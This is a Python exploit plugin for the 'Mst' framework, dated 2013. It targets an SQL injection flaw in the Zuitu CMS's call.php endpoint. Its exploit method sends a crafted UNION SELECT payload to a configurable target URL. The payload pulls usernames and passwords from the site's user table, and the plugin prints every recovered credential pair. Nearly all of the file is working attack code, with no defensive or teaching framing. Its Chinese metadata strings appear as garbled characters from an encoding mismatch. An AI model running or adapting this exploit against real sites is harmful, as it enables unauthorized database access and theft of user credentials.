
# -*- coding: cp936 -*-
'''
Mst=>exploit=>plugin
Zuitu=>call.php=>SqlInject
'''
class mstplugin:
    '''Zuitu sqlinject'''
    infos = [
        ['���','Zuitu call.php SqlInject Exp'],
        ['����','teamtopkarl'],
        ['����','2013/10/25'],
        ['��ַ','http://hi.baidu.com/teamtopkarl']
        ]
    opts  = [
        ['RURL','www.xxxxxx.com','Ŀ��URL'],
        ['RPATH','/api/','CMS·��'],
        ['RPORT','80','Ŀ��˿�'],
        ['PAYLOAD','false',"����Ҫ�󹥻����"]
        ]
    def exploit(self):
        '''start exploit'''
        if RPORT == '443':
            url = 'https://%s%s'%(RURL,RPATH)
        else:
            url = 'http://%s:%s%s'%(RURL,RPORT,RPATH)
        exp = url+"call.php?action=query&num=j8g'%29/**/union/**/select/**/1,2,3,concat(username,0x7e,password),5,6,7,8,9,10,11,12,13,14,15,16/**/from/**/user/**/limit/**/0,1%23"
        color.cprint("[*] Sending exp..",YELLOW)
        ok  = fuck.urlget(exp)
        if ok.getcode() == 200:
            tmp=fuck.find('[>]+\w+[~]+\w+[<]+',ok.read())
            if len(tmp)>0:
                color.cprint("[*] Exploit Successful !",GREEN)
                i=1
                for res in tmp:
                    res=res[1:len(res)-1]
                    color.cprint("[%s] %s"%(i,res),GREEN)
                    i+=1
            else:
                color.cprint("[!] TARGET NO VULNERABLE !",RED)
        else:
            color.cprint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)
